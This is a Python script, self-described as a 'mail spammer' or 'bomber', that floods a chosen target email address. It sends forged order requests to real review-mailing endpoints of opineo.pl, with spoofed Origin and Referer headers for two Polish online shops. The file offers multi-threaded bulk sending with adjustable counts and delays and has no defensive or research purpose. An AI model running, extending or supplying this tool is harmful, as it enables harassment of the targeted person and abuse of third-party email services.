import random
import json
import requests
import concurrent.futures
import time
from colorama import Fore, Style, init

init(autoreset=True)

def generate_random_string(length=10):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

def create_payload(email, order_number, product_id):
    return {
        "email": email,
        "orderNumber": order_number,
        "sendAfterDays": 0,
        "products": [
            {
                "shopInternalProductId": product_id,
                "brand": "test",
                "model": "test 2"
            }
        ]
    }

def send_single_request(email, url, headers):
    order_number = generate_random_string()
    product_id = generate_random_string(8)
    payload = create_payload(email, order_number, product_id)

    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 201:
        return f"{Fore.GREEN}success:{Style.RESET_ALL} sent mail successfully | OrderID: {Fore.YELLOW}{order_number}{Style.RESET_ALL} | ProductID: {Fore.YELLOW}{product_id}{Style.RESET_ALL}"
    else:
        return f"{Fore.RED}failure:{Style.RESET_ALL} status {response.status_code} | OrderID: {Fore.YELLOW}{order_number}{Style.RESET_ALL} | Response: {response.text}"

def multi_mail_spam(email, num_requests, delay):
    print(f"{Fore.CYAN}starting multi-mail spam...{Style.RESET_ALL}")
    urls_and_headers = [
        {
            "url": "https://credible-opinion.opineo.pl/company/0591f19736/automatic-mailing",
            "headers": {
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                "Origin": "https://wkdzik.pl",
                "Referer": "https://wkdzik.pl/"
            }
        },
        {
            "url": "https://credible-opinion.opineo.pl/company/b0d646d69c/automatic-mailing",
            "headers": {
                "Content-Type": "application/json;charset=UTF-8",
                "Accept": "application/json, text/plain, */*",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
                "Origin": "https://www.liderlamp.pl",
                "Referer": "https://www.liderlamp.pl/basket-4/"
            }
        }
    ]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for _ in range(num_requests):
            for entry in urls_and_headers:
                futures.append(executor.submit(send_single_request, email, entry["url"], entry["headers"]))
                time.sleep(delay / 1000)

        for future in concurrent.futures.as_completed(futures):
            print(future.result())

def one_mail_spam(email):
    print(f"{Fore.CYAN}choose mail sender:{Style.RESET_ALL}")
    print(f"1. {Fore.YELLOW}liderlamp-pl@wiarygodneopinie.pl{Style.RESET_ALL}")
    print(f"2. {Fore.YELLOW}wkdzik-pl@wiarygodneopinie.pl{Style.RESET_ALL}")
    choice = input(f"{Fore.YELLOW}enter choice: {Style.RESET_ALL}")

    if choice == "1":
        url = "https://credible-opinion.opineo.pl/company/0591f19736/automatic-mailing"
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Origin": "https://wkdzik.pl",
            "Referer": "https://wkdzik.pl/"
        }
    elif choice == "2":
        url = "https://credible-opinion.opineo.pl/company/b0d646d69c/automatic-mailing"
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Origin": "https://www.liderlamp.pl",
            "Referer": "https://www.liderlamp.pl/basket-4/"
        }
    else:
        print(f"{Fore.RED}invalid choice. exiting.{Style.RESET_ALL}")
        return

    #print(send_single_request(email, url, headers))
    try:
        num_requests = int(input(f"{Fore.YELLOW}enter numbers of mails: {Style.RESET_ALL}"))
        delay = int(input(f"{Fore.YELLOW}enter delay (ms): {Style.RESET_ALL}"))
    except ValueError:
        print(f"{Fore.RED}numbers only{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}starting onemail spam{Style.RESET_ALL}")
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for _ in range(num_requests):
            futures.append(executor.submit(send_single_request, email, url, headers))
            time.sleep(delay / 1000)

        for future in concurrent.futures.as_completed(futures):
            print(future.result())

def main():

    print(f"\n{Fore.CYAN}yo wsg, welcome to mail spammer($$bomber$$) by kacorvixon :3{Style.RESET_ALL}")
    print(f"{Fore.RED}KNOWN MAIL PROVIDERS THAT STACK THESE MAILS IF SENT WITH LOW DELAY{Style.RESET_ALL}")
    print(f"{Fore.RED}- gmail.com{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}select mode:{Style.RESET_ALL}")
    print(f"1. {Fore.YELLOW}multi-mail spam{Style.RESET_ALL}")
    print(f"2. {Fore.YELLOW}one mail spam{Style.RESET_ALL}")
    mode = input(f"{Fore.YELLOW}choose mode: {Style.RESET_ALL}")

    email = input(f"{Fore.YELLOW}enter target mail: {Style.RESET_ALL}")
    if "@" not in email or "." not in email:
        print(f"{Fore.RED}dawgg, that aint no valid mail make sure u typing it righttt{Style.RESET_ALL}")
        return

    if mode == "1":
        try:
            num_requests = int(input(f"{Fore.YELLOW}enter numbers of mails (mail * 2): {Style.RESET_ALL}"))
            delay = int(input(f"{Fore.YELLOW}enter delay (ms): {Style.RESET_ALL}"))
            multi_mail_spam(email, num_requests, delay)
        except ValueError:
            print(f"{Fore.RED}numbers only{Style.RESET_ALL}")
    elif mode == "2":
        one_mail_spam(email)
    else:
        print(f"{Fore.RED}invalid mode. exiting.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
